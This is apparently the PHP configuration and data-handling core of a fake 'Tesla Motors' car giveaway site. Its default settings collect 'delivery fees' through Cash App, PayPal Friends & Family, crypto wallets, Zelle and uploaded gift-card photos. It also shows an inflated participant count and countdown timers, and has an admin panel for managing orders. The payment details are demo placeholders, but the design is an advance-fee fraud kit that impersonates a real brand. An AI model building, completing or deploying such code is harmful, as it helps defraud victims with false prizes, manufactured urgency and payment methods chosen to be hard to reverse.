<?php
declare(strict_types=1);

$sessionDir = sys_get_temp_dir();
if (is_dir($sessionDir) && is_writable($sessionDir)) {
    session_save_path($sessionDir);
}
session_start();

define('BASE_PATH', dirname(__DIR__));

$dataPath = BASE_PATH . '/data';
if (!is_dir($dataPath) || !is_writable($dataPath)) {
    $dataPath = sys_get_temp_dir() . '/tesla-giveaway-data';
}

define('DATA_PATH', $dataPath);
define('UPLOAD_PATH', DATA_PATH . '/uploads');
define('SETTINGS_FILE', DATA_PATH . '/settings.json');
define('ORDERS_FILE', DATA_PATH . '/orders.json');

if (!is_dir(DATA_PATH)) {
    @mkdir(DATA_PATH, 0755, true);
}
if (!is_dir(UPLOAD_PATH)) {
    @mkdir(UPLOAD_PATH, 0755, true);
}

function defaultSettings(): array
{
    return [
        'admin_access_key' => 'demo-admin-2025',
        'site_title' => 'Tesla Motors',
        'demo_mode' => true,
        'participant_count' => 12847,
        'event_hours' => 11,
        'event_minutes' => 42,
        'event_seconds' => 33,
        'payments' => [
            'cashapp' => [
                'enabled' => true,
                'label' => 'Cash App',
                'details' => '$DemoCashTag',
                'instructions' => 'Send the delivery fee to our Cash App tag. Include your order ID in the note.',
            ],
            'paypal' => [
                'enabled' => true,
                'label' => 'PayPal',
                'details' => 'demo@paypal.example',
                'instructions' => 'Send payment via PayPal Friends & Family to the address above.',
            ],
            'crypto' => [
                'enabled' => true,
                'label' => 'Cryptocurrency',
                'details' => 'BTC: bc1qdemoexamplewalletaddress000000000',
                'instructions' => 'Send the exact amount in BTC, ETH, or USDT to the wallet above.',
            ],
            'zelle' => [
                'enabled' => true,
                'label' => 'Zelle',
                'details' => 'demo@zelle.example',
                'instructions' => 'Send via Zelle using the email above. Add your full name as memo.',
            ],
            'giftcard' => [
                'enabled' => true,
                'label' => 'Gift Card Upload',
                'details' => 'Upload a photo of your gift card',
                'instructions' => 'Upload a clear photo of the front and back of your gift card.',
            ],
        ],
        'cars' => [
            ['id' => 'model-3', 'name' => 'Tesla Model 3', 'year' => '2025', 'category' => 'Electric Sedan', 'type' => 'Performance Sedan', 'badge' => '🏆 Most Popular', 'sm_badge' => 'Most Popular', 'power' => '510 hp Dual Motor', 'hp' => '510', 'range' => '358 mi Range', 'range_short' => '358mi range', 'delivery_days' => '7–10 Business Days', 'fee' => 299, 'image' => 'model3'],
            ['id' => 'model-y', 'name' => 'Tesla Model Y', 'year' => '2025', 'category' => 'Electric SUV', 'type' => 'Premium SUV', 'badge' => '⚡ Express Delivery', 'sm_badge' => 'Best SUV', 'power' => '384 hp Electric', 'hp' => '384', 'range' => '330 mi Range', 'range_short' => '330mi range', 'delivery_days' => '5–7 Business Days', 'fee' => 349, 'image' => 'modely'],
            ['id' => 'model-s', 'name' => 'Tesla Model S', 'year' => '2025', 'category' => 'Luxury Sedan', 'type' => 'Luxury Flagship', 'badge' => '👑 Premium', 'sm_badge' => 'Premium', 'power' => '670 hp Tri Motor', 'hp' => '670', 'range' => '405 mi Range', 'range_short' => '405mi range', 'delivery_days' => '3–5 Business Days', 'fee' => 399, 'image' => 'models'],
            ['id' => 'model-x', 'name' => 'Tesla Model X', 'year' => '2025', 'category' => 'Luxury SUV', 'type' => 'Luxury SUV', 'badge' => '💚 Best Value', 'sm_badge' => 'Eco Pick', 'power' => '670 hp Tri Motor', 'hp' => '670', 'range' => '348 mi Range', 'range_short' => '348mi range', 'delivery_days' => '10–14 Business Days', 'fee' => 249, 'image' => 'modelx'],
            ['id' => 'cybertruck', 'name' => 'Tesla Cybertruck', 'year' => '2025', 'category' => 'Electric Truck', 'type' => 'Electric Truck', 'badge' => '🔥 New Arrival', 'sm_badge' => 'New Arrival', 'power' => '845 hp Tri Motor', 'hp' => '845', 'range' => '340 mi Range', 'range_short' => '340mi range', 'delivery_days' => '5–8 Business Days', 'fee' => 379, 'image' => 'cybertruck'],
            ['id' => 'roadster', 'name' => 'Tesla Roadster', 'year' => '2025', 'category' => 'Ultra Performance', 'type' => 'Ultra Performance', 'badge' => '💎 Ultra Luxury', 'sm_badge' => 'Ultra Luxury', 'power' => '1000+ hp Electric', 'hp' => '1000+', 'range' => '620 mi Range', 'range_short' => '620mi range', 'delivery_days' => '3–5 Business Days', 'fee' => 499, 'image' => 'roadster'],
            ['id' => 'model-3-sr', 'name' => 'Tesla Model 3 SR', 'year' => '2025', 'category' => 'Electric Sedan', 'type' => 'Standard Range', 'badge' => '🌊 City Special', 'sm_badge' => 'City Special', 'power' => '283 hp RWD', 'hp' => '283', 'range' => '272 mi Range', 'range_short' => '272mi range', 'delivery_days' => '10–14 Business Days', 'fee' => 199, 'image' => 'model3sr'],
            ['id' => 'model-y-lr', 'name' => 'Tesla Model Y LR', 'year' => '2025', 'category' => 'Electric SUV', 'type' => 'Long Range SUV', 'badge' => '👨‍👩‍👧 Family Pick', 'sm_badge' => 'Family Pick', 'power' => '384 hp AWD', 'hp' => '384', 'range' => '330 mi Range', 'range_short' => '330mi range', 'delivery_days' => '7–10 Business Days', 'fee' => 329, 'image' => 'modelylr'],
            ['id' => 'model-s-plaid', 'name' => 'Tesla Model S Plaid', 'year' => '2025', 'category' => 'Luxury Sedan', 'type' => 'Performance Sedan', 'badge' => '⭐ Top Rated', 'sm_badge' => 'Top Rated', 'power' => '1020 hp Tri Motor', 'hp' => '1020', 'range' => '396 mi Range', 'range_short' => '396mi range', 'delivery_days' => '5–7 Business Days', 'fee' => 359, 'image' => 'modelsplaid'],
        ],
    ];
}

function loadSettings(): array
{
    $defaults = defaultSettings();

    if (!file_exists(SETTINGS_FILE)) {
        file_put_contents(SETTINGS_FILE, json_encode($defaults, JSON_PRETTY_PRINT));
        return $defaults;
    }

    $data = json_decode((string) file_get_contents(SETTINGS_FILE), true);
    if (!is_array($data)) {
        return $defaults;
    }

    $merged = array_replace_recursive($defaults, $data);

    foreach ($defaults['cars'] as $index => $defaultCar) {
        if (!isset($merged['cars'][$index])) {
            $merged['cars'][$index] = $defaultCar;
            continue;
        }
        $merged['cars'][$index] = array_replace($defaultCar, $merged['cars'][$index]);
    }

    return $merged;
}

function saveSettings(array $settings): void
{
    file_put_contents(SETTINGS_FILE, json_encode($settings, JSON_PRETTY_PRINT));
}

function loadOrders(): array
{
    if (!file_exists(ORDERS_FILE)) {
        file_put_contents(ORDERS_FILE, json_encode([], JSON_PRETTY_PRINT));
        return [];
    }

    $data = json_decode((string) file_get_contents(ORDERS_FILE), true);
    return is_array($data) ? $data : [];
}

function saveOrders(array $orders): void
{
    file_put_contents(ORDERS_FILE, json_encode($orders, JSON_PRETTY_PRINT));
}

function isAdminAuthenticated(): bool
{
    return !empty($_SESSION['admin_authenticated']);
}

function requireAdmin(): void
{
    if (!isAdminAuthenticated()) {
        header('Location: index.php');
        exit;
    }
}

function baseUrl(string $path = ''): string
{
    $script = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? ''));
    $root = preg_replace('#/(inhouse|api)$#', '', rtrim($script, '/'));
    return rtrim($root, '/') . '/' . ltrim($path, '/');
}
